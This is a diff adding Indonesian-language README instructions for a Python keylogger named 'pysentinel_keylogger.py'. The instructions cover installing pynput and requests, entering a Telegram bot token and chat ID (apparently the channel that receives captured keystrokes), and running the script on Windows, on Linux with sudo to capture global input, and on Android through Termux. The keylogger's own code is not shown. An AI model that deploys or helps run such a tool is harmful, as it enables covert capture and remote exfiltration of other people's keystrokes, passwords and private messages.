@@ -23,3 +23,21 @@ Versi ini merupakan evolusi dari skrip pemantauan orisinal, mempertahankan algor
 Skrip ini membutuhkan Python 3.x. Buka terminal/CMD dan jalankan:
 ```bash
 pip install pynput requests
+
+Konfigurasi
+​Buka file pysentinel_keylogger.py dan masukkan kredensial Anda:
+BOT_TOKEN = 'TOKEN_BOT_ANDA'
+CHAT_ID = 'ID_CHAT_ANDA'
+
+Windows (CMD/PowerShell) :
+python pysentinel_keylogger.py
+
+Linux (Desktop) :
+​Catatan: Anda mungkin memerlukan akses sudo untuk memantau input global.
+sudo python3 pysentinel_keylogger.py
+
+Android (Termux) :
+​Install Python: pkg install python
+​Install dependencies: pip install pynput requests
+​Jalankan: python pysentinel_ultimate.py
+(Memerlukan sesi terminal aktif).
